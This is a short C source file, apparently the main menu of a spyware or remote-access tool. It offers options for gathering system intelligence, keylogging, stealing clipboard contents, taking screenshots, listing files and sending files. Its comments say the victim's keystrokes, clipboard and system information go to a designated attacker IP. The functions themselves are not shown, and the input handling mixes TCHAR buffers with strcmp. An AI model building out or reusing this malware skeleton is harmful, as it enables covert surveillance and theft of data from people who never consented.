#include "config.h"

int _tmain()
{
	while (1)
	{
		//Buffer that holds user input
		TCHAR input[2];

		_tprintf(_T("MENU:\n 1. Intel\n 2. Keylogger\n 3. List\n 4. Clipboard\n 5. Screenshot\n 6. Send File\n 7. Quit\n\n"));
		_tprintf(_T("User input: "));
		_getts_s(input, 2);
		_tprintf(_T("\n"));

		if (!strcmp(input, "1"))
		{
			//Get the Victim's system information and send them
			//to the designated Attacker IP address.
			if (getIntel())
			{
				_tprintf(_T("ERROR: GetIntel functionality."));
			}
		}
		else if (!strcmp(input, "2"))
		{
			//Intercept the Victims keystrokes and send them
			//to the designated Attacker IP address.
			if (keylogger())
			{
				_tprintf(_T("ERROR: Keylogger functionality."));
			}
		}
		else if (!strcmp(input, "3"))
		{
			//List files within a user input path.
			if (list())
			{
				_tprintf(_T("ERROR: List functionality."));
			}
		}
		else if (!strcmp(input, "4"))
		{
			//The clipboard function sends the Victims clipboard's
			//contents to the designated Attacker IP.
			if (clipboard())
			{
				_tprintf(_T("ERROR: Clipboard functionality."));
			}
		}
		else if (!strcmp(input, "5"))
		{
			//Take a screenshot of the Victim's screen.
			if (screenshot())
			{
				_tprintf(_T("ERROR: Screenshot functionality."));
			}
		}
		else if (!strcmp(input, "6"))
		{
			if (sendFile())
			{
				_tprintf(_T("ERROR: SendFile functionality."));
			}
		}
		else
		{
			exit(0);
		}
	}
}
